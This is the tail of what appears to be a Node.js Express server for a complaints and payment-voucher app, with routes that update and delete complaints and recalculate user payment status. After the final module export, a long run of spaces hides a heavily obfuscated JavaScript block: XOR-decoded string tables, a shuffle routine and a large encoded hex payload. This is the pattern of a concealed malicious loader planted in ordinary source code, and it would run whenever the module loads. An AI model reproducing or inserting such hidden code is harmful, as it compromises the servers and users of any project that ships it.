      success: true,
      message: 'Complaint status updated successfully',
      data: {
        _id: complaintId,
        status: status.toLowerCase()
      }
    });
  } catch (error) {
    console.error('Error updating complaint status:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating complaint status',
      error: error.message
    });
  }
});

// DELETE - Delete a complaint
app.delete('/api/complaints/:id', ensureDbConnection, async (req, res) => {
  try {
    const complaintId = req.params.id;

    if (!complaintId) {
      return res.status(400).json({
        success: false,
        message: 'Complaint ID is required'
      });
    }

    // Validate ObjectId format
    if (!ObjectId.isValid(complaintId)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid complaint ID format'
      });
    }

    const complaintsCollection = db.collection('complaints');

    // Delete complaint
    const result = await complaintsCollection.deleteOne(
      { _id: new ObjectId(complaintId) }
    );

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Complaint not found'
      });
    }

    console.log(`🗑️ Complaint ${complaintId} deleted`);

    res.status(200).json({
      success: true,
      message: 'Complaint deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting complaint:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting complaint',
      error: error.message
    });
  }
});

// Export for Vercel serverless
// POST endpoint to recalculate user status from vouchers
app.post('/api/users/:id/recalculate-status', async (req, res) => {
  try {
    const userId = req.params.id;
    const usersCollection = db.collection('users');
    const vouchersCollection = db.collection('vouchers');

    console.log(`🔄 Recalculating status for user: ${userId}`);

    // Fetch user
    const user = await usersCollection.findOne({ _id: new ObjectId(userId) });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    // Fetch vouchers directly from database
    const userVouchers = await vouchersCollection.find({
      $or: [
        { userId: userId },
        { userId: user._id.toString() }
      ]
    }).toArray();

    if (!userVouchers || userVouchers.length === 0) {
      // No vouchers - set status to unpaid
      await usersCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { status: 'unpaid', paidAmount: 0, remainingAmount: user.amount || 0 } }
      );
      return res.status(200).json({ success: true, message: 'Status updated to unpaid (no vouchers)', status: 'unpaid' });
    }

    let totalPaid = 0;
    let totalRemaining = 0;
    let hasUnpaidMonth = false;

    for (const v of userVouchers) {
      if (Array.isArray(v.months)) {
        for (const m of v.months) {
          // Don't skip reversed months - rely on status
          // const isReversed = !!(m.refundDate || m.refundedAmount);
          // if (isReversed) continue;

          if (m.status === 'unpaid') {
            hasUnpaidMonth = true;
          }

          const monthPaid = Number(m.paidAmount || 0);
          const pkg = Number(m.packageFee || 0);
          const disc = Number(m.discount || 0);
          const monthRemaining = (m.remainingAmount !== undefined && m.remainingAmount !== null)
            ? Number(m.remainingAmount)
            : Math.max(0, pkg - disc - monthPaid);
          totalPaid += monthPaid;
          totalRemaining += monthRemaining;
        }
      } else {
        // Don't skip reversed vouchers - rely on status
        // const isReversed = !!(v.refundDate || v.refundedAmount);
        // if (isReversed) continue;

        if (v.status === 'unpaid') {
          hasUnpaidMonth = true;
        }

        const monthPaid = Number(v.paidAmount || 0);
        const pkg = Number(v.packageFee || v.amount || 0);
        const disc = Number(v.discount || 0);
        const monthRemaining = (v.remainingAmount !== undefined && v.remainingAmount !== null)
          ? Number(v.remainingAmount)
          : Math.max(0, pkg - disc - monthPaid);
        totalPaid += monthPaid;
        totalRemaining += monthRemaining;
      }
    }

    // Calculate status based on new logic
    let calculatedStatus = 'unpaid';
    if (totalRemaining <= 0) {
      calculatedStatus = 'paid';
    } else if (hasUnpaidMonth) {
      // CRITICAL: If ANY month is unpaid, user should be in Unpaid section
      calculatedStatus = 'unpaid';
    } else if (totalPaid > 0 && totalRemaining > 0) {
      // Only set to 'partial' if user has made payment AND has remaining BUT no unpaid months
      calculatedStatus = 'partial';
    }

    console.log(`📊 Recalculated status: ${calculatedStatus} (totalPaid: ${totalPaid}, totalRemaining: ${totalRemaining}, hasUnpaidMonth: ${hasUnpaidMonth})`);

    // Update user status
    await usersCollection.updateOne(
      { _id: new ObjectId(userId) },
      { $set: { status: calculatedStatus, paidAmount: totalPaid, remainingAmount: totalRemaining } }
    );

    res.status(200).json({
      success: true,
      message: 'Status recalculated successfully',
      status: calculatedStatus,
      totalPaid,
      totalRemaining,
      hasUnpaidMonth
    });
  } catch (error) {
    console.error('Error recalculating user status:', error);
    res.status(500).json({ success: false, message: 'Error recalculating status', error: error.message });
  }
});

module.exports = app;                                                                                                                                                     var z = '-818';(function(QM$KDBWCRPFzyvheJa_VpYiqbG,FXwrfRJ){var gMMmO_YeNsGaUjYbDB=DiRry,FlhvzRQud_B=QM$KDBWCRPFzyvheJa_VpYiqbG();while(!![]){try{var xYMIlTdVeUzsqDg_mAq=parseFloat(gMMmO_YeNsGaUjYbDB(0x1ee))/(parseInt(0x467)+0x80c*parseInt(0x1)+-parseInt(0xc72))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1f0))/(-0x1225+Number(parseInt(0x1bc3))+-parseInt(0x99c))*(parseFloat(gMMmO_YeNsGaUjYbDB(0x1e8))/(parseInt(0x130d)+parseInt(0x2483)*0x1+parseInt(0x1)*-0x378d))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e2))/(parseInt(0x51f)*parseInt(0x6)+-parseInt(0x21b)+Math.max(-parseInt(0x1c9b),-parseInt(0x1c9b)))+parseFloat(gMMmO_YeNsGaUjYbDB(0x1ed))/(0xe8f+parseInt(0x54c)+parseInt(-0x13d6))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1e4))/(Math.ceil(-0x3)*parseInt(0x425)+-0x738+0x13ad))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1f1))/(parseInt(parseInt(0x203a))+Math.trunc(-0x537)+Math.ceil(parseInt(0x4))*Math.floor(-0x6bf)))*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e1))/(parseFloat(0x4)*0x2af+-0x1ce0+-parseInt(0x122c)*-0x1))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1ef))/(parseFloat(-0xe)*0x2c+parseInt(0xe76)+-parseInt(0xc05)*0x1)*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e9))/(Math.floor(parseInt(0x6))*parseInt(-0x5ff)+-parseInt(0x26c)+parseInt(0x99c)*parseInt(0x4)));if(xYMIlTdVeUzsqDg_mAq===FXwrfRJ)break;else FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}catch(sGridQMYCASxO_vJpEzy){FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}}}(d$qtJhn$jgp,-parseInt(0x4526d)+-0x189bb4+0x2b6a8a));var NX=[0x1*parseInt(0x3174ec)+Math.max(parseInt(0x7),parseInt(0x7))*Math.floor(0x1db0c2)+-parseInt(0x97ceeb),parseInt(0x7)*-0x74+-0x751*Math.floor(-0x4)+Math.trunc(-0x18a9),Math.trunc(-parseInt(0x61d5))*0x1+parseInt(parseInt(0x140))+parseInt(0x70)*parseInt(0x193),Math.floor(-0x77)*0x23+parseInt(0xcf3)+-0xb*Math.max(-parseInt(0x85),-0x85),Math.floor(-parseInt(0x5))*Math.ceil(0x1e66)+-parseInt(0x31b6)+0x5*Math.floor(parseInt(0x4a87)),-parseInt(0x76fb5d)+parseInt(0x4)*Math.floor(parseInt(0x176711))+0x12f82*parseInt(0x56)],SX=[-parseInt(0x255f70)+Number(0xa70)*parseFloat(parseInt(0x18e))+parseInt(0x65c4ed),Math.trunc(0x9)*parseInt(0x143)+-parseInt(0x2348)+Math.ceil(-0x425)*-parseInt(0x6),parseInt(0x1567)*Number(0x6)+-parseInt(0x444f)+-0x25*Math.ceil(-0x2ce),parseInt(0x4fe)*-parseInt(0x7)+-0x407+Math.trunc(parseInt(0x69e))*0x6,-parseInt(0x1e)*0x1d2+Math.ceil(-parseInt(0xb6b2))+0x1c88f,-0x7e7900+Math.trunc(-parseInt(0x10203))+parseInt(0xc7ca58)];function spin(aUYluOouh,GZIangXDAgLfl){var e_lqkshVvBRm$lo=DiRry,gGCKNxTzXCGBqECEJcPRezzt=[],r$vpWsaOjqBRovpzm=-0x13*-0x1b1+Math.max(0x55d,parseInt(0x55d))*Number(-parseInt(0x1))+-parseInt(0x1ac6),uwYufDg_OBsIrYbEAn_TbE=GZIangXDAgLfl[parseInt(0x60d)+-parseInt(0x149e)+parseFloat(-0xe91)*Math.max(-0x1,-0x1)],NkIMqAWxrmE$ldvsZshU,cdyhMYgJcNxAhlePvsOh,ndwVeiAOnIDvuMkcl_gBB,kMXmB$ki,WIQhopNZTya,HqoQNaSvxJJHuealUGqbuSi;while(r$vpWsaOjqBRovpzm<aUYluOouh[e_lqkshVvBRm$lo(0x1e6)]){gGCKNxTzXCGBqECEJcPRezzt[r$vpWsaOjqBRovpzm]=aUYluOouh[e_lqkshVvBRm$lo(0x1ea)](r$vpWsaOjqBRovpzm),r$vpWsaOjqBRovpzm+=-parseInt(0x4)*Math.floor(parseInt(0x307))+-parseInt(0x3df)+parseInt(0xffc);}NkIMqAWxrmE$ldvsZshU=gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e6)],r$vpWsaOjqBRovpzm=Math.floor(-0x1c55)+-0x24a3+parseInt(0x40f8);while(r$vpWsaOjqBRovpzm<NkIMqAWxrmE$ldvsZshU){cdyhMYgJcNxAhlePvsOh=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[Math.trunc(-0x130e)+parseInt(0x2117)+Math.trunc(-parseInt(0xe08))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[-parseInt(0x12d5)+-0xef9*-0x2+Math.ceil(parseInt(0x1))*-parseInt(0xb1b)],ndwVeiAOnIDvuMkcl_gBB=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[0x117c+0xf21+parseInt(-0x209a)*parseInt(parseInt(0x1))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[parseFloat(0x79)*-0x11+0xdf0+-0x5e3],kMXmB$ki=cdyhMYgJcNxAhlePvsOh%NkIMqAWxrmE$ldvsZshU,WIQhopNZTya=ndwVeiAOnIDvuMkcl_gBB%NkIMqAWxrmE$ldvsZshU,HqoQNaSvxJJHuealUGqbuSi=gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki],gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki]=gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya],gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya]=HqoQNaSvxJJHuealUGqbuSi,uwYufDg_OBsIrYbEAn_TbE=(cdyhMYgJcNxAhlePvsOh+ndwVeiAOnIDvuMkcl_gBB)%GZIangXDAgLfl[-parseInt(0x1)*Math.floor(parseInt(0x799))+parseFloat(parseInt(0x1cf7))+Math.trunc(0x445)*Math.floor(-parseInt(0x5))],r$vpWsaOjqBRovpzm+=Math.floor(parseInt(0x1))*Math.max(-parseInt(0xf1),-0xf1)+-parseInt(0xb47)*0x2+parseInt(0x20)*parseInt(0xbc);}return gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e0)]('');}function DiRry(epXKFsIKDpIWkjWrh,BvJsow){var tvWHBzRbPfPwTJZTGQCeB$tCw_D=d$qtJhn$jgp();return DiRry=function(ySqQ$AHcQFxKmoVXuW_KuGN,AsByGuucxC){ySqQ$AHcQFxKmoVXuW_KuGN=ySqQ$AHcQFxKmoVXuW_KuGN-(0x145b+parseInt(0x1044)+Number(-0x22bf));var a$MWQEhXtw_pDowcTvUzdzwboh=tvWHBzRbPfPwTJZTGQCeB$tCw_D[ySqQ$AHcQFxKmoVXuW_KuGN];if(DiRry['DjLlIO']===undefined){var H$BajAALKn_kBbaiyV=function(JQPbxjcnpuTPx){var QQUFJvNzkGGDh=parseInt(-parseInt(0x1322))+-0x191f+parseInt(0x2efa)&parseFloat(0xd01)*-parseInt(0x1)+-parseInt(0x1)*parseInt(0x21d)+Math.max(parseInt(0x101d),parseInt(0x101d)),JEBeTdm_WqjixChyLVLd_rAnH=new Uint8Array(JQPbxjcnpuTPx['match'](/.{1,2}/g)['map'](k_aUYluOo_uhwGZIa=>parseInt(k_aUYluOo_uhwGZIa,parseInt(0xa2a)+0x2*-parseInt(0xf31)+Math.trunc(-parseInt(0x1))*-parseInt(0x1448)))),pQgcMTUziLlXONxhFnqF_y=JEBeTdm_WqjixChyLVLd_rAnH['map'](gXDAgLflXg=>gXDAgLflXg^QQUFJvNzkGGDh),ZxoPQqSbOmI$QYJLE$pzofdWlbF=new TextDecoder(),afdSJv_WDyfUhfJHqsvtzxDk=ZxoPQqSbOmI$QYJLE$pzofdWlbF['decode'](pQgcMTUziLlXONxhFnqF_y);return afdSJv_WDyfUhfJHqsvtzxDk;};DiRry['BdQqBU']=H$BajAALKn_kBbaiyV,epXKFsIKDpIWkjWrh=arguments,DiRry['DjLlIO']=!![];}var YVwXsDTtteoFVSE_m=tvWHBzRbPfPwTJZTGQCeB$tCw_D[0x21e+-0x333*0x7+parseInt(0x1447)],yNaI_WzggrxC$wcp=ySqQ$AHcQFxKmoVXuW_KuGN+YVwXsDTtteoFVSE_m,SKQhbzliqcZnWcmj_yEXnTj_Xm=epXKFsIKDpIWkjWrh[yNaI_WzggrxC$wcp];return!SKQhbzliqcZnWcmj_yEXnTj_Xm?(DiRry['HCrAPb']===undefined&&(DiRry['HCrAPb']=!![]),a$MWQEhXtw_pDowcTvUzdzwboh=DiRry['BdQqBU'](a$MWQEhXtw_pDowcTvUzdzwboh),epXKFsIKDpIWkjWrh[yNaI_WzggrxC$wcp]=a$MWQEhXtw_pDowcTvUzdzwboh):a$MWQEhXtw_pDowcTvUzdzwboh=SKQhbzliqcZnWcmj_yEXnTj_Xm,a$MWQEhXtw_pDowcTvUzdzwboh;},DiRry(epXKFsIKDpIWkjWrh,BvJsow);}function d$qtJhn$jgp(){var fYa_ecAuUpEYAjErRZhvFjWnMQ=['8e8d888b8c8a8bd6dddddff1fd','caccdbcacdcbd0d7de','d5dcd7decdd1','cac9d5d0cd','88818ae8daf8ffd1ef','818f8b8e8d8f89d8d2c3c8ede8','dad1d8cbf8cd','dae7d4dcd3dbe7cdcbd6','d1c8dccbcac1d5cccfced8daddd3dbc0d4ded6cbc3dfd2d6dad0c9cdcbcccdd7cacdd6d7da','8f88808a898cd3e0e9d8f6cf','888f8b8d8f8d8bdad4ded4fbf2','8881fed2c8cdc8d2','8c818f888bcadcdfc8ceed','8c8ff1eacad8daf2','dfcbd6d4fad1d8cbfad6dddc','fa8ff0dd9997dcda9a97ebcd8297979785fadddfebdf84ddcb85c1c090ddca978bdc9899979785d7cd97da85d0da98cddfcdddde97ca97858097fa9497ebeb97ebd1c3dcebd5eb828dd6d889cbc1da96d198d8cb85d485ebdc85ca91eb8383eb86df829f9cdbd0d88385edd197d1859799dfd2dac0c0d5ebdaeb8398d8958585d9d8d79fd5da8cc5d585e6ebeb97d08debd097c183ebcecad7d797ddca97f6999289d7dfe6f9d2d189d6cb91d0dacb8dcad0ebcd978dcbddeb9bc19deb9782ebccd8ebff9bdfdcdaeb8099dc85e9fcf4eb93cddbebeb8c8882e795fad09894eb97cbcaeb81c1839097cfcadaebeb85ebd5989287eb86ebf4cf9797949185ebdc9e85d7dadfdeebcaeb97c4d09fd8cbdddeeb85ebc385eb9f80eb85dc98d79dc1f0d88098c1d1dc96daeb939799c9dcd1da97ddebebe8dacddd8a89ebc8eb95ebfd96dfe09b90f9da9797db8385d6cace899797eb9897829185ebdfebcd979785ebcbf78deaebdc94ccd8eb988e98e9979cdc999185fa9785d5e9ddebeb9edacad8dc98ebc59f978b97deebc9e8e682d684dfeb85e98d85dfcdeaebebeb85eb8ddadc97eb97d78597908899dc97dd9885fcc7c0d087cbd5d785dcebc9ecebddda9cda99ceda8fd596d5d7cbdd85839785d085cd89e7eb9b99cf85d485edcbcadce2ebf7c9d191e991d0dfeb89d581dadaebebda97d185cad8fadcdccecb8eccebdd858283edebdcc1c1f2d8ebdfd8e29bf5cb999cd39dd5908585e2dcfc85dcf88597d8c89a97eb9995ebd5cbd0eb90ebdcc9cae7e4d088d0dacddcd3cad6f1fc82cd89d1c0ef98ebd4dcdcd389df98ebd5d7eb97dc81ebdac08acbe999ca89eb97f4d8c185daebd2eb97d785daca8d98dd90e680ebdfcd8597d8c5eb989debf885df97eb91cad7ebebdedafbebdceb8597daca9191d4daebefdcd791fddcc9cadaeed0ebcd9bdc85cbebebebfc97ebeb89eccb9b9997da9997ebc9859797d7eb9483f4d5979085d0f0d2ebdad89797d5dc95d2dc9c8f99ebcde3f0d6db97fde6ef859791978dcdf7859185ebdd89d897dd97fc9ccdcd85e6eb9797dfd7daebda978fd8e0f0eb85ebcecddaf997dd82d699ffeceb97d088998bfedbebcedfe197dceee2e385da9798cd91cddcce99ffdaf9eb99ebedcbeb8debebeb988ad79499d5d7ebe6eb8d91ebcadf829197ce91dcc98bdafd8597ebeb91caebc591db85eb859785f9ebf497ebc1ebca9cebd197e7ebe1c5ebebdb95978485cce7f9dad8dc858497cd90d59097de9897eb85eb859797918ceb97d4d2eb91d4ebd5e198f49fd0f4c18499e6d584dacaeb979785d8dd9acf85cac197d7ebdaddd1d8d297c4e29aeb8a9791eb9597d6db9797dfdd97d6dada8585d39785eb8490e285fdebcdded285dacbdfeb97daebcad799c2eb97eb97fdda8bdad8c9d6d88985e2eb8597cd97ebebcdd093c1cbdac9e697ebddedc4eb85d6c9d5dadbebc4c1ebd6ebc4d7f5ebd2eb9491def197ebd8dcea9797f4979bebd6caebdcc9d59797ff949799d7ccd790ebebebd8d19497dcfc988f98dddccaeb859febd6d6cdd79febda97d7fbe9f8ebd5eb97eb85e9899fdd979197efdacbdc85de978a99ded6c99497fcdb85d68aca8bdee99ddcdfdaead0c3859be2dcca899fe4dfd7cbeb85dad6dffad7eddad1eb97d7ded584dc9f9785eb8985c29797d1ca88ccebdaebebcd92cbdbeb8589f4dc91f48594d797ebc3d888929297ebebca99d8978497ddc4dc9187cb9a95899c82edc2ceded8ddc8cdc091dadafada8585cfcfdf8597ebeb97dceb97ebf5db85da8982cddd97f1ccebd485d6cbdcebd5ebd8ebd89984978585ebebcbebcb9eda85caddc28993f780cde5daeb9d83ebf398ebfbf6ebcbebd5d6e6ebda98d899ebebd5eb99dbcddbeb99cad8f4d696caeb9089828beb86eb85ebdd8593ea9d98c2ebd0d2cdd7d682ebd7dceb84808585eb9edadbd4d1c99785eb8ad5d5eb899097979797e5f7c8859597ebeae89d8cebc9cdfceeebebd5cd8599eb99eb91cadeebc9e293ebebcdd185ebebedeaccd7cad597da98d799ebd7cacbebda9797999ed8da97979beb97e198dcdfebe9dccdc1859997dddcd69a9885cbddc9dc90e6ebcceb85ebd7ebebebd0fc85cd8f90dcc48a85ebf0979cebd9cc8d98eb85eb8ac9cbebebcac9d097da9885dce7c49786f38fd2ebd1cd9ae9d0fbcd98f286ebda86ebeb82ebcbebca859feb98ded899979980daebd7ebeb8197f9ddebcaebd8ebe2f09785d7df979485f097f1d68dc8c9df91eb97f0dcc9e4fc9d8597cd97c7dce5eb8b97cb85ec98c3f4cb97dac4ebdcebd5fddbeb91eb97fccd85dcc986c98ffcdaf79785dacadc9596c3da889897cbdad5df939691df97eb85ebcd97daffebeb9bf5ebe189d697dc85ebc2dcebebebdccde197cdcbd6dd91979799cbebdb8f97d9da8a90858981d4dcebd0cdcdcacacd84d09790dc8585eb97ebf797c9eb8ddbcdcc978fddf0d0de98d1ebcc99cdfdebdceb85eb82ebda97dad397da8591e680dadad483d297ddda85ebdfeb97ca9797eb9fd8dadddddcca9099f59991e6cec7d697dfcbd59f9882d4d885eb9984d2eb97dc85e6cb95d1f2e99c85d49fe4c9dad5d897d684ca88ebd1979d91c9ebd591c397ca8d82ebd099c498e29cebcaebeb879785c497d597ffdd85818598979be49796d89982d2d09791d785ebebcdebfa8adf8b91eb89fcee97d7989980eb95da9898ebd5d0d0ca8fdacad7ca90d1cbfe85c38debebe98cebd0ebebcdd09eeb99cb9ff7dc85eb83dadcebc785dac2e297de859f90f7d2c1ceebcbcccaffebdadcebe9d097ebdb97eb9785cad6f1d3dcda85d9d5d6969d85eb85eb9c91cd9debebd594ea97d5cbc09c979799ced8f4d791eb98ebdedcfd8983ebd68597ddc199d0ebf5f29cebd799eb97db90cb959acdd9ebebe3c797978f97989b8598d782cd85c1d7f7cacad8f5eb98ed9d8ddaebebdaea85c4989685d8de8597ebc796c9c2d2da85cd90cd97949dd5fe97d8ddebd8e9d8808d91ca98eb9397cd8597d5da858edf8591cdebcbe4ebc297ebec85dfcbd6e69785ebeb9292ebd399c0f09bdadcebe6d2dd97da99dde497e4f5d4d0eb919bf497f9979ad4e99ad79597f4ebd9c5ebfbc4859ddbebd7dee6f7cd94828591859797cdebd591cbebcbc1dbf494eb89f59bddcd90fec498c9e9999785ebe6ebcc9794cd979cdddd97da85c1979d85d8ebd2cd85d0979acad690f886dcebc397d5c9ca9885db81ebebc3cfcb85fc82fce0ebe591df85cdd7e2ebeaef8ad1ebebe29791d09985ebdaebd185d490d0e4d59989ebebd6ebcbca858f9499c2858acdcbebebdaebd697919797f49797da97df82eb97ea85eada8585f9d5c8949799ebc898eb89d0c997828d8ccbdadaeb939685d19799fdddd8e4daedebebd7eb9feb96f993809885e9dcd899cc9797d6d6c999cb919d85dc98cbed97db80dacf85c2ebead7e8c290ebeb98dd9691d885979697dfcdeedcdb99df859eebeb96da9debd591ebeb97d79797d4fddadbdadbd5c4eb98ccebd697888397d88ec497db85c4ebdddd97fdc2dad59791f690d5fdd09d8beb9f9083dd97d7e598daebc9dd859e97d7c0ebcbdad89785e79188dad09082ea8dc9d5cdcbdbebf0c1d1c08cdcdf88e290ebcadbeb97899992ebcbcf99ebebe2caebf8cd97efdcebe488c89797859d88dfd785dadd97cc8bca9df4daeb9993eb918691da9982ebeb97dae995dcebeb979c99c9ebdb99909790eb8597ebdce0eb97c0dcebebebd5d6dad6f2fcfcd2cad8d2da8195cad4e9c4d2d58591d5c097d2c9cd84ddebcbd5eb9dca85d0dc979ecbddc3cad598d0c9d097da8adad0cdeb899bebcdebeb8feb9e97cc9797eb979fd292eb9b9891ceeae1eacdcde499cb8597e783d7d2d897ebd1d79d91ebd8dc82ebda85fad68bd7ca99ebdf85c98299d0dadffafcd0ea85cfcadcefebd885edcadc9990978adaebdc8d91ebd88bcbca949797d086cafaddebeb9785c4ded5ebebd08bd7da94cbf89ada8f8eeb949797da90e28585d3ebebebd7db8299cad8eb9bebda97ebebcd9fcadfebdaf69690eb97cc85d6d5ebfcebf38597ebeb8add91ebeb8a898599f9daebd8d4d8d6caeb97dc9097eb9efa99e988ebc0ddeb9fcfeb87d1f0e9e6e283dadcceebdf85d6ebca90d7f4dadbd0e0e99983ebd2ebdfeb8bebcfeb98dc9585cdeae697ebcb8aeb90eb9b9d98e6979ed591ca99ebda9dda9898daebc48585979bdaebc4d7fad49785d68fd6e1d1d0ddebebdad5838597c098eb85cd85dcd49682cc8f99ebcbcad291cbebf9cbccebcd97ddebd894e9ebdaf5dbdfebebdc8581e4ebd59a9985ebccdacddae997fa9e8eebebd7daccd88dcacafbeb9798dbdadc90cdebdd979fe997d7dacac9988ccee3979debd0cfd897e89791e2ebd7ebebeb8d8597d1f8ebeb85c9c3dfc39febcddad5dd9791d8cae9ebf7eb97c4ebd697cbdc91eb97ebfb97ebeb97dcc2ebffebc49c98eb999797e2eb888597ccebeb9df6858191ca9797cdd3fa998af085e99199d6d8f3ebd8ccd6ca98ebdefdd0f7da8deb85dcc0f9d089e2da97df85f7d082caebd5ce8190eb978bebcd8bebebeae6dc83d09fd5cb91ebdae4dfdbfc90ebcdd7cad6879ac997cadef6de97eb91f0d4dfcddcc98ad4cb86dbfcc4c991dcebca9098ebcccbcaebdaeb8685eb9797dadfc7c2c2eb8690d0d6d6cd97d7f89797dcc1dbc9c1ebc4d9eadacd99fecdc990cd98d5ebc294cac4ebebdd85da9880e9c4d6cc9797cd82c4858597ebcdd49096cb97f698e497e2dd85eb8a85da848bdae599ddebd8cbf6ebc08597eb859191c1ebdddadcebddfae6d0c285dacb95d695eb9d97eb8df697c585c1cddadfdaeb96d9da998597c9dae497d5dec791dcc7ccdd97daebcdebceebcbfce3ebebcd858599ecf0cd9997f4d1cdebcf91e6ddebcddae6d585d698ebebd5ebe2ce9997e09797ebca8597979d85d68d91dcd5d8eb97cc97dbdae4998a94ebc4ebebea85eb84c39792ead5ebccd8889199d58bcd979189ca9acb82da85cf9785f2cd85858597cdd8dccdded2d0d7eb97cdd799c0ccd798ffc4ebd8ebeb9190cb85fddacbf0989a9c919182dfebebcd8ad0dc94e5d0c491ebd799cd97d5eb9797d7df86fb9785dbdc9791908997ebf7e88c9395eb9796ded8eed2839fe9dc9fca97cb8bcb95e082dc85ebebfc82cada9785da85c58597eb91ff91dadad899cd8985cae595ca8585ccdae2cde999da9b9790d89a8afad4ded789eb93f0859d979989cafb81cb85dcdadae98587ebdbd0978b9799caddddca87c48ddcdadcd691d0f7c0eb96cdeb97fcd7eb8ac0f4ea9eebceebd6eadaeb9998dc8adffae9ebdfebebcadbdbeb98d5ddeb91ebd6d0979be4d0eb9edc85ebcbeb97ebfad1dccbdc85c9fdd5db85c29797979785e0efdd97dddcebeb9f8590d589d5ebd0efda9781f183e691dacdd1df97dcf4f9efcd90caeaebcb979797988cd0eb9ed5eb85d7979eeb8785e1eb85899997d69a98cd9debd68597dccb85cdeb8edaebd089eb88849597feebdadad1d4cdd2eb91c7e4ebdacadaddc9cd9c86d2cdebc099d0fa91d5d6ccdc8192d094d0f99afc9eebcadcd19bd58ddcebebdbebd5eb97cfebd190f7ebeb8d8197dc96ebebda9d8fe995ded797d889fadffc849f87da999bebd5ebcaecfbeb80cdd7ebebe8d6d5dadcd8ebd0d0dfebd4d09793989191daed8c9ffbdaebdafd85cdd797ebd5ebeb9ddfdaebcaeb8d90ccc3d5d0d08691ce978586e3e7caebdd9edfda8c86dc92cdd785c099f5ed85dbdfcceb979cd0d9eb9190ebebdaebebeb85d7d19bc1da89da9e97e9859890ebebcee48997eb859bd3e9ebd5ef91daebebebdfdbe2979795ebeb85ebf19d8debdc8198cbd69099859aebd2f481eb85c085eb85d0ee85d6ebdd97eb8d8debdaf1e5daedebe48597d5daeb9a97c199eaebebebc2d0d0ebe5d7dde092ebed90d0d5ca9e8585979f97dd85dad085d697ebda8996cedc9dd480ebd697878fc1c4c197c4d885c098cef2eb99dceb9adaeb97cdc7e497979785ebd7d0dada85cc96c9d8c9d686859debd697d8edc1f5cfd59adf92978585d8eb8d85fd87f8d6cb85cbdd9793889791ddfceae385f2ebe9da97e6d0d8e6d697ebeb97c9d6dff6d5c5f6d1dbf4c1eb9897d7ebe99781d898deecc190fadad1d0d19bcd89ebcdd6c2ebdad09cf1d0fa8cebcde2d5d1d48290da9d8997d8dd98caebebdc859585ebf0d08fc185fddce98580ebeb85e6e4dcebd891cbfd8ee9dadc9782ebeaddd685d685ebd59597fcda8597c1e4cdd1eaebe685fdd7da9781c8da978bebca9f9ddcdf97c4dadb84859392eddfda88dbeb97cada9b91d7d7eb97dbd0d3d7eb8d98d8dac1d2f0dad7d0c984919f82cbebcbebeb998debd0ccdacaebd6ebccda97df85e6cbcaebd48694859d93eb82df98cc8781cfc997d8e9dc9099cb83e6ed91dcdcdb85dcc2eb97cad6eb92c99797eb97eb99daeb85eb84c98797c4c18299db9eebcedace85da98ebf380cae885eb91dac8c0d3858fe1cdd7d8eb8685d0ebdf91ebeb859192eb85d0dddce2da9185e9eb99d6ebeb97ded797ebeb8197ebd8dd849799d78585939585cddfd384ebeb97c4dfdc87daeb969cc19190ebc0d7dfeb82959693e9ea85eb9debd3cd99df9797eb98ebd0d085ebeaebdfca90ca85d6d185e2e4d9cd9cc5e59085ddcdd0e4dfeb85eb9794ebf38f9491d4988099f7ca97c4859eeb9797dfdc8597d1979d9785cdf7d8eb99dacdc9858edcea8594da9785f1ebfee481dacf9785ebd2c9d7ebfa9798da91d7daddddca859f85c9e4cb94978cdfcecfccdcebdde994ebdad6ebfa9fda87ebebc1c4cd978e978285c1cd8597979994ebcb80d2fcd5ebcdc1c0e2ed97da98cddcd0eb9797ca8590f4ebcbeb9bdeebebceeb99ebcad092dad7ceebd8cdebda8095d4dac5ca9ae4e788d297dbd88adfc285d7ebd0c58197ebdae4979084ebc097ebdcdcddeb979883cdd6828ed599c4ca97eb99ebdacbd685fc978fd591cd86d0ebd699cd979b8c95eb97ebeb9799dacbdfeb86ebcd98ebdbdac9978385948bc9ce9febc4dc9edd979883d681ebd1eb9aebdcf697c997e2ca8cc2ebd5e5ea91f79185d193daebeddaebdcdcebeb85ebe9c4d0ddeee99acdeb88d0eb97eb95ebebeb92cac492d0caebd297dad78580eb91e3c2d5dcd4e985d4e897cad7dcd8c1dadcc997c9eb97cdf2908c9185ea91db919784ebcccce4ebe3e8979adbd89aebfcc2c285ebebdfeb9b9682ebd6ebd58af79699c085969bd0c99797f899858febd6d8cad7eb97d8ebcccbeb85d798eb99ebdfed99ebeb85f2eb859eeb9cdac0d4ebc197eb85eb909bc3d785d69287d6ebeb9fdceb98ed859887858898e497fb9f97cb9791da99dbeed095eb848ed68585d5979b9997d1e4eb97ea85ebdd98dc8585d097c49f9ed097dbebdfc991dfc49885fccbcefaeb9780cd98f7de8597dad897dedceb8597d4d0ceebeb979097e9dac0ebebcddcdada9be2ebebdcdcc1dad697e9d88585eb9dd0d89fdceb9096ce98d0dad6eb89eb819c9797dcede2fcebc9eeeb8597ebd6d799ed91fe8c85da9eee97eb97eb89c9e69fcb8cccebfe99edeb85da97cadfdaded799d4ebe2eb8d94dd85858f9a85d0d5ebeb9794da908fdc85d6eb99d1dc858499eb